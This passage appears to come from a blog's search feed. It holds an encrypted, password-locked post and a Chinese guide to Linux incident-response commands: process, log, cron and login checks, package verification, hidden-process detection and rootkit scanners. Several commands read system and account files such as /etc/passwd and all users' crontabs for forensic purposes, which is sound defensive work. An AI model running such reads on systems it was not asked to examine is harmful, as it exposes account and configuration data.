e3c161402c0b273cbca2cfc893ae16cf4cddd87e24a15a99b8079d306b10f7d0180cba4d07f3931548558bcc359cffe05f8f636cf643478975498578168f326381b4e3c86938fbf48ba6d1e279ddd89378adbeebca85acec0e7599deaebd401aa62a74ae7e3bd1aafd3c263963955d801df4db601784ae5cdb6078fec4f557b999db2309b26deb62be6f1480aab69417d2c703e5e97c9c0b777f7c6e742b23f6562c99a96fda49e813f36f24055a900f9fbf933080a66a552654880ecda48b9eea783b84b8d077b2248af73d258d26fceb4e9fbd26f90413af8022cd0c4ceae15fb286e14c524a2115b04f6e0a8af09ed5310d27f908e114f026a00a08da11e9a77fb3662e90ae17848ced44bca6e838cf88cff3a38805348eac449a1ee3840e5fd9ef3b5317a7843a3549e6a5afe6e96b5772457705b132dd931929e2612aa2d43778b37124b171b15259153c1ad9e26d30ed471442b987d15fce3892a9094c3aa4eab1a5f52f710e20117085a92aa3c83f108cafca2cca346c187767f00915ac13b55ab1766c01df5cb967f6a28b4f296915d08cd03f5f828554316d8bb33d627db2a95434ead36beae9118a207f3d694440b7c0484cae1a85ce05abb3cdb40e22b24a0b48398d799a4faf6d87b2461e78754deb11ec0e98e448d4cfaa85f969b4e66c9c695d9fe80b3497ecd202338191d4cfee6317387a5ac4406aa880d07a5565ba6ecc6d7e84972a740f41e79bfe11f0bd61fe8473d65a666ad4f265295d5efe7c81258caccdfd1c0a6427acf9fba275e833ee9eeba6954cc8f2a55cb0a86851f228fbe670de45c80dc18541341f274a48cd4009af41b400ab6928e1bcf0d206a5c5bc13d53a538938af6c1a6b03438c7265aadff6270b19dd0180ce28cd404958e2d093380c2367ec48b52099c27bf08dbb178cca7f80320d02e4150f8127141d0c6bc1d5b526fe00f034c67cc8306e6516a5f0ddb824fc09e3708bc518cc81c1dc624dc2908cead13d97f37eb8b8d3f9aca8f44d205cc2311da5a491449f0fdf06a6631a031eed184766e448c7ca416b704a3262f870ccb4fdf697538b2762d80f83cbf22df7cb0275a91f520aff269567cb56ad9d0c9096e2cacd3d075301d2bfa08730bea560b673a25495584c70ca211b5ab636ead61ca705e61f45d1de12e40c54177a1bca28d39ea88c5159b32d24ccf36b15f2506f7374ab761ba3c25e71e77710ff4299eb86a759b5b66c4b1857d7bee6a3b4c926681ceb97efdf4df7b5183dc988f9cab8df2284533134860ebca262d90de7ff924e046b68db15abdc653284b2ce1ea80ec556c2c2bcfdfd540c9f58076383e74c6cff606a9576f4edbe5ba45f9c4e6f0cf013dccdf77279676467ab0d0b42f17ea2570c5e522d6379a3e86e69325bef11b1b013a68b057b4c3acd26abe9c357d2275e7f86fbac94b508de6dca9edde21c643353d419fa2e5be9358fcb4669f40e219c0b651de79cc70155f9e2cc7972444e031434dcfafe7eda0336c9889eb7dbc72c5ab7085c2a358704a95f4cd32dfad59f207b0f929740f9e1de974e31e5e162b059f3d675c574b59d1681dbf8ed977daa8eab54ec748ede404dcf631ba342d1cca94926ec3da376038fa07466f0551a29b14d77c6e902a1ef97f53f7263442c065eaa634fd4085b3b43901cce4e59ff6558848dc91804925f1ae3b719f9df0e4e7cf739113538abd31cbb270aea58dc9fe7bcc16b675f42c9012efb32a51ef86f05913f11602cdd71550cf3be18abf3a0c909cc9a87e1b6d4e1dcf4c17730f3e858ed01f29d81eb65bce5b1a6e3567e638468a24585f0b7a6126b895db4b4dd3d1065e49df12f0f6249152d8278d1e92af36e74d110cbe535e9c1d34c445b5c6e94a5211b69b933e4ea32980486acae4ae2cea2e4d7de25d35cceb4c44c4f655191219c5b5e181915af20e59076e725595c0d0cccd6bae5a012050aadbd76aaf33d7d7c4c80a39a78af3a0d9344afc41e038b1d8ff5472051b842a3ab23fa4d2da8f8dc6498ad42a05d1d0e1c5cf479c1fd6162b38d02457c2f02258751ff8da9e4e53171d66dd6f6ca663a861c23e8f74c7b14f18442d61d28782b6f2c656823fb1eade71e4fbf37e61e3ee5ebec3501151bef6550dac7cfdeb1567739fb7c0ab07e976d0d691e9ff9b925c41b1d18f098e2f1d20c7e798f5b79fdddbc3ab3d63eb62b8624aacc54437779289821414493296d013a26614d5e80d300904f4344d0301a3b87eb80e33b582ce1b7f6c7c3da45d6da77263a1175fb1a88df8c1bafa15c642fd04ad0891134e89c38e4829620bd05fadcda165169f8541a445d292da45d302e8f6bf7013d256596fbd82f85580ea4110ddf630a6ece0072073ad22653b43a86cd0ed21820402ef1f933b1e2e6898297159bd548dca773300379e143a1f1c5d7fd024beb17a1a1d939ff11a5a03f1dbf6202e14889364f600cb6b7a91250db14f2c59710a3e59c81df72fde10e9f1027e8f6f118aabbb1df8959b46810d9a649ac59da9b897614dce72ee59bfaf4b5279067b47ed303e95364b56097d94b66d73afa07e93603a6b614dab06032ae19b2d5f9dca3828a5fc1a29912ff1acfb329ec306541512a2577b7b8c9bc3a523b5e5e605368aa8ef324e81e0eb46912735a5ac71a2377fdb52fbbcf18e7a2abc5ece80cfc6c5639bcfb67a0d502f6c70d24b3b5fef3445b48eec0e7e52a0c66af50464bd604fd3bf2063f5fe7129d7c97d5b14088d11d3dc92f33f09fb88593c0393373576b27aa2b8218a3f013c0c2066b1d661c93b7e2ef5d597ec6281fda4bbe4a1f8bc9fc93fa6e0b0f4a74601fc2fc80fe70220eb3d40eb8fcd27e73704b6eea02d14bb047b7ead3a87507d839ad7addfb944b75c689b71afa25146851164b416bba8d20ee2aae40921eb5f4ae84572c2756f52efc8f0333fba44597b30ac8e173439b34315ddd31ee307e870e7ff53d69ca8a78dbeb65a64bd90c17c0e6d390f436f3ff386b9cf66ab206edd13fd593cdd76b2bdf197b93159a4ada81614617cd4821cf703013d71d33854e62be0feed3572f4a83fd32548b941dfe8818915e91ac16a3b2289ae713d48c7683f036259c90e20a2b4add94dca3dcffcf9794b343a215929798e86eadf2793d514dc669cf9dd647c9d6f06704919003741d9efe3a485f38c1ff710174e733bc07a80431d53466ed1b784c6614d88a8753256057ff8aaaa3828973e9c0839b3fda6f521adcebb3f39fa5f6cc6f7da71d6170a1d28fce49709d0b7441ef8b3ca0874eed4a011f1e35468ee9ece570473138a4bea7282f43955f435616640ddfae40a77642b262c7e53ada3ae426f2d5e794d4002a5bcb8c5414bd36bf43c5a65303afa6748dc0592b4cd29e2a5dd7966beaef6893aa8a7c50e13597683e4d98c5a9e95e56b033ed393439da0e06c90e884f72ae9bff2d27d45ac5ad6196eec96905a25353721198a8d276ff3af71aea9bee2c00aa8bcdfa001db5c43491382bc85a3c06dc110b6a7afd1208a56dd3256205b3553d54a842e1b4328cfc5ff3dd9c75c15375082cdcf7ac38b3ed20f8c7efd12c0f270b6b4991eb436386652b3a132d77b082e8cc1a10d157e743613791612952e9250851c5c4adc0da65f6d5a06a2df2cd81f672686287ea49cfe81726db154a7364ba5c910606025aaa6cc6d04346ad22febf329f2f535cc317efdd4c45d6e482a65a925eeed6f071b353473d9c69b9dd288ae35369acdad2b1e6934e915580d5ac022672a16ff7985bcc37567a6266fff0a622dfbebde81806a04cffd656cfcd3225baf79dd904eced9c61b4a153979a8f798f5c6dd9d656eab4cec3f0a07b6d2fa6bb51c7c285261af16967f419a1ff4abd05ecef51a7518018b4658645520154c1a1bbb3de8b518906ec5acc94ea77c07580f18ca0d5088d57f03f5abc7426cb57972ecc4c71e992961f4fa7175af5b37f018ee12c037f2aaf26ba6fde7076c1d4e9fa3bcc0aff5e49830d18cd130134474d3785760ebc1ad81772b013f43ee23c89e39c2e65a1c4dbcd23e7af14520563a6fd24ed89329929eb4deb79f8675d84760638ebc096d4aff0db85b1c25d56f3671b93abebd0e7c4064cabd18448e45ce9e584bf8cac15fce2843752ca5685d927db1e6c011437c355d201689d9075cf6ff35cab163dc6c72375bd39b608d7a116a2f94b48ea9ed9f569c1781a34a7478b46f268f11a7bfd94e9ca1e3e9dcdb1b8f426e325a256afe34ae58160aba93339b288ac4e830478d09d39c7570f12d5beced8bbce9bd255502b2adbb18eb121f169139e21b66abee2e077dc98366de2889e40186310d5f108f907c3eb4fe2e55f0fff26743590d67d6ea4f421830d7451b239a1bb020dbe27eaca01211d61663b78cbb43b4639c3f18359e356c6bd21e22ff5203986ce661f558e5f9220314a2f4dd2910cb390266fd1d2b622b7e06e1bd8627a232cda5ad4778fa7de3c8103f25e3ee92661e715274c67a5660951bf729e317d5c02c499faf1f145f680e24f007175448f54f944884530463459f00d5159a7644313ec325b10695186d632249ea041e7ac8e4b5affcf9d9dbf12b8fd8e78cae350c1dff5c147a66ddd3dba9c0d5eab816cc62b45548897e6c807030d7b318dac30c0a0958616843fd37af8e92da1428887228755f8240dc13e9b3d2831b3eaa67a2ea0141a3e651bdc37e35f48564faca0ac008215d9e99bb2dd7f6c1c6e1f67516eaf0de4b9d8f9d1b77e9b6d66c1e9cda9bc58259a113c6e186163a394011e95d747f7d5a4abfead2bcd33ee3e8e6947c156cd84afb1e8ae332af85a1c5e0e370c47bdddd48a891e6afeb9d6e3762140bee0ad04707c8e8838238d9c415aad60daabd4a5392a79a356e9a00776d2ba58d1c64256634abba3389881c1cdf80b0b5a1ea17c4d8331234608ac84bd960ad7dbf91cb11ae3d89e59309c425138f51f0e3631337440d4b0cc570d652f9acd3f1b256d52d928a67e545eceef1e80dee3d4424065c5200d1a186e84adcaaa7c0fc2634c533b36f0b88074ade3ddf1b88605adac6a8b6423673b8dbb278469452935a2cc007011b811344e7abf97f09c250ee505f82e7bab6bffc055d56236324674f41be3c6a1a0e0f821c3c9186b3821ae635e21d61bafafcf91bd932cfb7e1f1eaa1521368900676a64e411ded9f3f1955ff758471c72ba51d8e7e461f9fb418f7b56c3b305e2942a024d97a461ad6f134df7ff8546b11bcfe330dc04db4a38dbcf4614afaad6b09f0ff14da8a206a569e9cdc2615307f04be8e9b2256031b21c1099f3871c77023440f18a98df31ae566c8bbb2f1d821bf99e2db9eb7d781db513687f04c2b67ebb52aa671a4d80b00a7dbbfb33b074b18ed43df09bec0566ea423e7fe7fc205fdaf7adb3816c6a3f4c531657aca30dc00270031b947b977c818f92245a4a9d08c703303ecbd4abcb822dec85198036146ccf39489a7228d96c82350298d36a95ac3c1b97f6800601d7ac6e5551626e5ba9ad4f848e73b74876c1c9b63cff544d75e7e70983d26e3000816af0d204e1641835ce8d7b8f7861ca308f3b46af6784b6848ae8dba096b7eefaf5b2ac8b51355f658516a6007a9d90002f0fb9e1459afa98eca0e9b0c06682ebfb7b673e6a6d3eb69b2620b21e24166c18938da1f0dbd5da9a3dd79afc11bc265f4ea093d705827d04c01b839e84a7a9fa18074c4e587c5c28a1f7fec109dea012840a62990e779e0c9cd8ac8e4327327c01e12713b4ff05dfa1306199908e430804732c529ea66b4665b4e41ab5b6aaffb0cf9c2f48b88286a4e38ae0ebd6a99f5606623c87a87e4b893597dafbbe72be13152a7cec40a8157a278094de93b513cbf80efe1e5a980c67735bf54c54dd2ed5ecefd43f171e217abbb98bd20921b73e65d05bf1ac34417e7703b5172040cb292281ffca846bb5f30b0955a49256821e403494c2c3071f2e23f611741282a31125b9402e57cde22bca6f39bcb538e08d5f211e8c00fd40e73cf45eb8e778894e2c141dc383f0a9c53d6a68f996bf9b7bd8d94bca202a49273520f1c66f06aaf6318aec4fef496448c984b71e31911a3df84546b53646be2ca80f2220c1d8ac0c19468124d4571e893b95601414d86b0152480562e9429eb812e68537bfe1d2bb04d44dc87d6ff23e1b98fdb6444105dc574c02b870a2434ad77058171a0d2b7443194ba1d135b6235db06dc5332b1278b96366c57e9befc7b248135e4b45c072447fb4649fae9fbb21a986e306038cdb095f281f517e80734f14fc93b197281ea6defdca75e58df388c2dca80c755b23711e18224b551aca33d772a3c79749ac52d83b204177dc9c0b3192e70ccbb3ff72eff8b3a9930ce16efae4ca9c60578c332923a274aa367d5d80748565c435f2bd5970a7bb74c2c3b5fce01a7a31e81dcb3523cd2d3b3e7d1b12b8a1d439ca9f7bc2a9033d2617c47d30a77fe16ab41ff309a3716e10697dfcbf30a8edaa1644f5bcf72b21090880ac08a78ed387e3cd127eaa5caeb94591b8e2e38c14995d8ec4a1c503031cc642d70f1cd2963e4b885dfbf69b5d9ef638c640d8a40bf6b0fb31655516726254596f1a90262cac7c1e6396422708a17e84e7dd36e9051593d9808384abcca42b9b979b03b367380cdc605e5f24acd9f4f418f3b1d29284a871471e5bef79c78609d91c05fe57983ee6631f786e53081e4db44e90a8cd47866766e0f27394b836e5386d138df556904f19f0d19c4f4dbda61916f1118765778ad2b8caf31cfb583599874656556f49c53e1fe71622697f7111e146f0690a6cdd2d796cd34cd33cc193526ab372b1c9330851f47e43406202cad3fa994dd8fa57487f7b17bdb258ae3ab389f9edb2c2a2e91c7c664e3c724706a316737c5aa5aa27fed3a10709bc0c5141a3d94d17f16055ee0cb1af67d7b436e581e4108a75672d844907fa3242b26bab93e660bac8c30c00ef9c458a10d6d95a7af028dec990c47f07f2b22ec66d409905ecc53cf851a26cbf800d46ec83d3d68fec1b183901909224c80d4c1f8e89d0f626ca528aafb421b029891569d9a5b6d7121de5a53e11ee3cf4eab68ee1688973a7a6ef43f1b6afde6b5ffd4fc8171d1583dc03e1fa6a2580cc3730cf4772fe220e46dcef1f59af27114d0a265ec3f65429e066bfef6b3f55921921bd8a6ab603dccf5c768f15fc3d79be1ab54c66f1ee29b40164cc87c5d396b1626efc7add4bafc55d7fb0c3434f3ddbd25f1ae5fdbbd15af59f5888bf9e2994a5819dcd255fb64cd5ed988238ee6c93e9293fac0c1a03311bb146450b09da4ce6a7e74ff475bd11abee2eaf65774ed0d7cb243040d0e6582f209f8325d640fbc5601be76c0588acb567f9bf1f5cd6a53ecc0c4ec95d1a4f7d1b6e9099ddd9efbc385a6ba7c19bd64cebf3bdc6599fadbaf75cdd1340e047054c1326217751a0887d1ae57ce2062228817319e978fd80b086ffb4eda6ec4496c734be5d3c3cb537d035d5884257a0fd85ef97cb1066659e5851107810c9a1bfee86203f643d044f5da0287768b64c0acb5c1d1c094a8bc58b1518a966100f4e84e22d2553864de7b734a663ab82dcc783313affbf2817bb1a2c9d4c0a4f69563dc106ea31298b9f48e3499e172d12115423137985f9f3efbd3ad7b98287cd49f1050ecbb8ebf2c6d3ddae58e416dc016ea9670adf87f9e0afb446bb6777c3919b12232183963851459d9c392d63fac2746c129fa77794f763a3a7c90a1dac352ea01ceb409ee9979f8daf88fe642e187be5681ea80bef42e3baa17ee216c4718aa0cce93ded341e63264cc6755d5470f6c6e986a215e42f8f34d68802a52db06b70a9db4d6673e5e969af48ab4b25d40b24b993125a6f061a4cfc396b30653b3ebec5e9cb8f172e7b3151c4d0ea8f8bc49510f5befe500bf81029407e41b81cb390bc48c27b906a4cdea4e732c1df456c73bbd2d30d5a39099dc166897c7a62bb23cfb34fa8fb1e583f7766ff7ff155ba7a9a4885bdae545215718b8a545390f14baefc7d9f1e78e9af376a7e954b71fd4119cb12258e312807fa06267a88e91b58aae415611af5169305917d6b0b54f595e9c1d61b32adf44a8bd103c64a9ec51d6fa4808179705a7703f02af674135131b984b61531492c3cf44e9bb91d78b2ddf5a41292d794dfdee6f411f87bd38f40bdaf2f9409c7158e72befc5509e7944d4c6884b2c4052294d4235b503010ccb256fc7dcd3cdb6028f42386ecfbcff81ce0943dcab75b8f2e0f4958b4ea6d47d69566138c2db853873fa82b4f5c3d7cc8ea4cf6d8410b71f3a028440831842481f7d34cca0cfe4150ffd6b02da37f49bbcdaa5819d80359e6173776d984f9bae5d21e44397ac0af321b16c89415557afaba1a745475493c5f4d347adc69a7f4dbb72ffa531d7ea478dc88909e336da4044451d30ec680b0de4390011d3b7767144e2ed8282d6de5dd2974567978bd6e249d7791eb0526337208f0d3809e2390dd126c59aec86c290108571bfc99efa27a176f36f100dfdc456602ad22b809c80beccc5718b3508f81e0677753587df0d7755566455fe822555d53ec4ba647eca2bf4e8ac5db0a5075fb02454701e2c9f20e5548fe68b3810dcb9e210c0ea2e67fcc0db7a7bf92c14fde46cb5d2ed3ddfd1b46ff8e022c21049e886788020f768b90f5ee5323faaa4ba4a96790c84dc67222f5b9050a0bf32bf0b0a0529e95104f7e9faabba8273dc383b42e470a60854fcdadf32278289f72f2536b722899c952d08ce34f4f87892f768cf74c531e246da9f0dcbe3957daaf52353cd376bb7d31a3ddfb0a32b4d13a2d0d89b4fed417e8a5a7b1d1b68896661357494784e4fd62147c8e487e5c9e0ca56d2c37105e6b4614516a665850b3e3461835caec141464ea9b15f882f45eb8529dc13894597ed6dad80760d6839228466f78f73fad44462a3f17c9ad83ab07eab50e71f6c0ab4e04672c985d569be4988a8d5d455696babd1c0401166805617f2b2e3b1c7c3e17741a047f49120ff5d38e515f8d3cb092a526e37ea73bff08e8fd72eeda0e0c628f64248b898cf3cc6d31382bc08c98d05c285f5bfac25352a5ac12c3cf691e6d260925c0fd320642046723a7b691859faf8370774aa8991ddcd4699e4cb5f860ca5dd2d02b83513ef86b697fc51254655eb6e710d5c3016a90856519f22a1b9de032849ba507a44da08ce9d9f5d2af20584d4ac5e4a88066b9318ed12d4334b272e6925280595bfcd7b4dc9242451d3769822b4a5ad7f23d7c8428ba02774aa214039e532b65b44e398bf8707f5f4308b11251e4080b2a6d1a5c8f86f8e0db9207e03c560e3460b90d87470c987b8991fb0509c7480d7cfd96ab60d8eb6311a88aac156580234a8d60bd0252b48a67e42b7dee0970d65d65d965caf7e04039853fdc6228f8d9d8507dbaa8f208252545e9d74d87db04bc93bc10d3a4310554f33a2a741f9f974c620d590dd880985bdc3168b368485456bd31e5c8f3d0853059f51419e4ce7d6525eef82c4744b48cbde6fe0feee2eb05c0a8bd4d5255db0face58a6d556b6b1e326039885c9005d56a2b66c806bdeb48cf59a0aa82f3fc15c2f9604518ce48171571a3c7f1c3f9c73c47d923aaeef368174f477339e7e9315a23edb5319179437bf8f2384cd315cb1cbf6bb15d7471c789d754276874952c2498a44449ee7a20d3ce03a2b90ca6c012c035cf60ce188d9eba0efaa7ba6f65b48fc8f7f2456e41400b3b3cfc016aa2eb291f54296313599ea0bc6cb52de9ee21102e3b37601b3ffb73181318e8c87bf28f8c71dcc7598ac1ad6e130d76db6f57ce88f08958c830db09a91369090686ebe916de950b4d58fd6258b83896f0b034d2d0fda218880f9a2ba3af327757ed57deccefc4e393ce0d210a9bb4ce14031184d665582787686a0f5275cffafc17044a24a0cc096bccaa4a85a1a6fb911544ec653f09884edab11b8bdb38321c5f46ef37831d247a61b35f90aa8b40a1fc18da53009a9cb6237e32994a182af1c0b955a98cb0ec49e7cf60244e0b7f84ae196fa6961006f3fc478b235b4d6a3504d0e19338c6641479be15daa95d799bc294c4dac1796550824b0b8d8bb6d6a17612995e05a1ca357d18993d3692aa92357358a84685abf5965687cbe8684fbacc8b072bd9929005ccd52e8a2507fdbdc4a71003f136405e6f44a881b65e4907fdb53dc042cb6dda149add2c551d7fe0228ee540494d7238b79929043138c191a89769a7f60c1d54b71c657b242ee504a35a3982053c602d0d0b0a7b0bc3be6459b67b29d2706edb1bbdce5113cdf8bc2ad5655f894732387debedffb5351db42efe8d03c0f5b06f88494eb99541cbfeace7d7755c6fdd60678e8985583e6e1b6bab897814411724da3ccc90734bf5a242717242907b64d5026870e6fafb30372e099ee6ed9a483e7b88783221f71ea38a15cd694736e7ce02d7f06c1ddebb436f6993659c86f78f3f83e751b18769a080cb205ea1289e0a9ac5e49c97431e90893d0b3a45573f067c3b1d050fc40b6d7380c7ce253f1ee60d7e7b8a3c0b83a3afd0c97ff2a1c520101f4b50f655dce0e43850371350d445f0cab81cdfc7d539001dde4f3ee30f61460524e12f7920bdf046ecacd9509c01aea6a399e78f9220e389f670537b2bc83c7c40d853dedd2a6d35782e523bc9687d1a434b7720f69d5800a1883c771aa0d16a056b3fd6268ec9c79466f68beadca87bd0b3ea6adb9ca7ab48e167b059ca7fb1138b0bd3666d9477c3b5a21b909d2f5e467194143e63fb6064a1ebd52dea06aac282b8cd9bdb84abd8296bcbf449cd817b9d9fd793af4022468b00737308de2e4ea7ad3d4c49e2b7c7188a28632ba7221eb39b4c18ed27ee681c01bd70629f95a8ab5df61c2a648e2fb87fd74f139c0c61825bd01ba03ecefec49a2eaed927b1b025f3d08a34f9732468b5546306121ad312c259945bdc6894798fb32f093dace5971dda646f4eeaa63ef497f9a08661a0adf3f13b900289665c41f094f74c2d37bb850a569b2e08f79c824a00024b385f15953eac86bc6e0987e933eaeb036731f850c5048022bb0a789acd51926a2088fe5fae715ca21638bc81a9b123111673baebb321bbf063a870a5350dd141d3094715ae022f013b6701ecf59ae84fb2e77522b64fcd76a2d0fbc5c6b6d46941c49c104ecce3a697fe33e374d7da8af8766d12bdfac31693694e93912febe8c9b326c495148ff7bce32f49cb0562ef312b6907665698244a8d7aa91a549c387b7847ef50736c78131d48bfe970b03daed0bab9820ceb7f9521568cc7dbcebfd94345ec535d25162fe4c00c3b0df6b74cadbbfeb8ee977f002f84ddd527e057cbf3c4fa8048c04108ba7aa4035eb9355dd008df8e79f1e4d9022a910801a80700ae477d7f031d48ae1014a2bf136f51c58f7aee20e89d3a92adecfe6abdab90cdb5eeef24e0037552e17c385c59c54d3419812265b7514368dfbff68d3789278757c5b3162d0240c5a4fb4dbbf6de1c7eb4f0200c2ab11f137b1548bd7bdf5c10d23902c239a6b2deb1f55ea109d3a494fe8fe7e8c76bdd67e5cec9c9c07bfdf7137de29e98073c95c5d79234fe90cf481636de5a5f76171a768a41c34987142414b770a7ddc7bce194ede007c84208494331576257db2fddf0824bb9b83f27d4e232af3a56b5d33a87d1687d8c744ea3a76de6bcaba27b04d390c6ad2cd68911878e581e1964850b782628f43a8984505ff55235c2ca022a1888b009a4e0dfe65da3e729a42d09f580d52d37291f830b1771a0ab825dd2794a6e3bf372250a1fa0c09133b373aeabb179abbe4bf4a462b234054e70abf26a10392a9badf444f4e1487f42c9150f765dc9b766d17c74306b92c5444b6e5d74b5205d8564d524f452371c4b390a8a9629136d04ff0dd568ddc2df3e4f7c92ff4198046bfeb4909e819fb7611677db321a22d6826fe51ea17d67e8cffca07388e930526049827f16ebcdec7fe51ee8529d91263328905da2ab3dcdc8705acf1344f5b4562637a279b7714aa26da88bfee1c4621f6fbb95d458adc32ca25e71987fe0b44237cd920758535aac4bf7f2767ad872cd253230ab29053d8dbe32695d2c78ef86c8b1ef50d379f3f95eeda0e1f8b670523a5ac132a6671e9b3c7b4fe8bef2d80e907842c36e43f799cb26c4cdf1eb9c29576a299ab2676941d6c5c34af8fbe17ab58e80010b2abad69ccc51615c1e3bb7c20c42e47e975ca9aaad4a56b985f11ecd839ca21b67bc057cd0369c5dcfec75671e24b145190a68792aa0370487f1bdfaf9665e0726d962f47e449ad9f37f1658949806d4c60ea358d9596c3df589304fe4653606158c8424e66a446c307a9598bf53cf442d14f00141e45d4b763dbb2b3a5d3cb8e40cdb6f8be7479313340ea0e3a8ad437516aff32c6e2d51b9becadbae10c6bea3e29fa070855f6195752e0f68f3eb6460d1ea5215f5d821c050a93cf079ca382be73ba5bcea0083387359b663425d14a07aa90a2b2665d1e43da8b7addfcf2e812535745343fe4dd882c8aa54d13c976306e085ef994350a067e902855739c19365b7107e9e7398b81bc1dd6092c287a0155ce4aee4fdc0f9d4aa162ffbd05f4ed978b75a7ffec9a8896a2c5c3e56142545878b10346166c33c29746b048d5c6530ea606420edd5aa791153d114e4c17ce1e995bf5dc723bfee2e8cbe4cb4222e1e4fe369ef254d17ffe1034ab72bfded2b6bdbc73c61f400cd68b0dc7bdcb76d7679f1748ae6447d7f62c4adbfcc4f2496b2e49b6c465b4ab3c01ea952f77def5dd43a0c2848200cac33952c5fd071b9d7a0e614cf0cc23e7d7eaceaa42c5516b6f84c99707ab44e664cd54eed0d6f9a89c8eb7d395fa88d1bc35c0cfc46c15e1e2778187a8b677e03bee7ca9b4731d1e01ab22802365ed0fd0281b1222e4c397910c72888493cb04af877cfa1a3c95b1f1ed06d8c955e47cc2e5a1e0ced1cdf92497ad420d720396c03133a131d4fdaa04872c53e17a8f8607392b4d29870987c566c3f6487dd43be271f664b4c5b5d7c6a9a8359b1238c91845a8d592a7b30149370e16a8a660c053584daf3cb2f1d78bf70769013192ab3ca1e851513d7b878f64f1d614298c57e7a9e80a925584c1eed6b4b525a6e273b5174373a52850c952b69c1060330b9a57411ee14356bb499323af2ec6176f3bf91e387f544e64a8f4c5d2f8d0fb4b9aa7ac00fbc1a2267762c4c0e97a390846c6427f5f285ffa161bfeb84c9cdc29e2d87f4042f26fb8f9aecc3ea1f5bb594d78e716b6586d04b498086cba8959f35ddb8ccbc283ef1951ed1d3664b2098de05399869e1b592b788aa820960632441270c2a1e2c1ea73e84a6b4526c112ae09108c1ce516e3bd916e351d57f1d8c6d605cb76ec8af7763d233a0947c1f99df381ffcc558b13d578c0123d411bfae7636ccb1f5274f6b74ccf2ef2a2dcb066c9f4fcb3859330a8d5e085162c10f4919611dacbbff2ea68a7844fbca543b7d0f75330d91e7c3c6c20bcb6249884e1455a0be22ead17c33ed79667e7949aaf1a1e8687b1cf34b144a7d4ce6056fa38bcd850cb785a4b081958f2c55120bfa5b21f0bff7b953a5958a8fbe319bebf7f1d4b5c405dc519dd1bab56eef10
  
    
      
      
        Hey, password is required here.
      
    
  

]]></content>
      <categories>
        <category>hw</category>
      </categories>
      <tags>
        <tag>hw</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应中的常用命令</title>
    <url>/posts/4dcb61d1/</url>
    <content><![CDATA[应急响应应急响应流程
事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等
临时处置：给出客户临时处置建议，断网隔离，保护现场环境
信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析
清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件
产出报告：整理并输出完整的安全事件报告
linux重要文件和目录


文件名
说明



&#x2F;etc&#x2F;passwd
用户信息文件


&#x2F;etc&#x2F;crontab
定时任务文件


&#x2F;etc&#x2F;anacrontab
异步定时任务


&#x2F;etc&#x2F;rc.d&#x2F;rc.local
开机启动项


&#x2F;etc&#x2F;hosts
本地IP地址域名解析文件


&#x2F;var&#x2F;log&#x2F;btmp
登录失败日志


&#x2F;var&#x2F;log&#x2F;wtmp
包含用户登录日志


&#x2F;var&#x2F;log&#x2F;utmp
当前登陆系统的用户信息


&#x2F;var&#x2F;log&#x2F;cron
定时任务执行日志


&#x2F;var&#x2F;log&#x2F;lastlog
所有用户最近登录信息


&#x2F;var&#x2F;log&#x2F;secure
验证，授权等日志





目录
说明



&#x2F;root&#x2F;.ssh
root用户ssh公钥和私钥


&#x2F;tmp
系统或用户临时文件的目录


&#x2F;etc&#x2F;init.d
开机启动项


&#x2F;var&#x2F;log
日志默认存放目录


常用命令查看当前目录下所有文件并排序ls -alt

查看系统内存使用情况free -h

查看系统进程及子进程ps auxf、top

查看网络连接netstat -antpl

根据pid使用ls -alh /proc/pid命令查看对应的可执行程序

查询端口打开的文件lsof -i:port
查询进程打开的文件lsof -p pid
查询用户打开的文件lsof -u root

修改文件属性chattr
显示文件属性lsattr

排查启动项cat /etc/rc.localls -alt /etc/profile.d/*.sh

查看所有用户的定时任务cat /etc/passwd | cut -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;ls -altr /var/spool/cron/*

查看历史命令historycat ~/.bash_history

校验软件包rpm -Vadpkg --verify



值
说明



S
表示对应文件的大小不一致


M
表示对应文件权限和所有权不一样


5
表示对应文件的MD5不一致


D
表示文件的设备号和驱动程序不一致


L
表示文件的符号连接内容不一致


U
表示文件所有者不一致


G
表示文件群组不一致


T
表示文件的修改时间不一致



软件更新会导致大小或MD5不一致，同时出现SM5需要注意


查看文件（目录）详细信息stat

查找当前目录下，指定天数内修改的指定类型文件find / -mtime 0 -name *.jsp
查找当前目录下，指定天数内新增的指定类型文件find / -ctime 0 -name *.jsp

比较文件差异diff -c

查找隐藏进程ps -ef | awk &#39;&#123;print $2&#125;&#39; |sort -n |uniq &gt; ps.pls /proc |sort -n |uniq &gt; proc.pdiff ps.p proc.p

查看用户登录历史记录last
查看用户登录失败记录lastb
查看用户最近一次登录信息lastlog

登录成功的IPgrep &quot;Accepted&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more
定位有爆破行为的IPgrep &quot;Failed&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more

查找每个IP地址的失败登录次数：awk &#39;/sshd.*Failed/ &#123;print $(NF-3)&#125;&#39; /var/log/secure | sort | uniq -c |sort -nr

查找特定IP地址的失败登录：grep &quot;sshd.*Failed.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;

查找特定IP地址的成功登录：grep &quot;sshd.*Accepted.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;

日志分析Linux日志类型大致可以分为三类，内核和系统日志，用户日志，应用日志内核和系统日志：这种日志主要由syslog管理、根据其配置文件/etc/syslog.conf中的设置决定内核消息和各种系统程序信息记录到哪个位置用户日志：用户日志主要记录系统用户登录或者退出的信息，包括用户名账号、登录时间、源IP等应用日志：记录应用程序运行过程中的各种事件信息

可以使用系统自带的awk，find，grep去分析前面提到的各种日志（建议使用busybox，以防命令被篡改）也可以使用第三方的分析工具，比如LogForensics，星图等等
应急工具busybox
集成了很多linux常用命令的工具集，当命令被劫持或篡改时使用
官网：https://busybox.net/

unhide
检测发现借助rootkit及其他技术隐藏的进程和TCP&#x2F;UDP端口的命令行工具
yum -y install unhide安装或者在官网下载

chkrootkit
linux下检测rootkit的脚本
ubuntu系列安装命令：apt install chkrootkitcentos系列：由于chkrootkit没有包含在官方的Centos源中，因此要采取手动编译的方法来安装，官网
直接运行后查找infected关键字即可

clamav
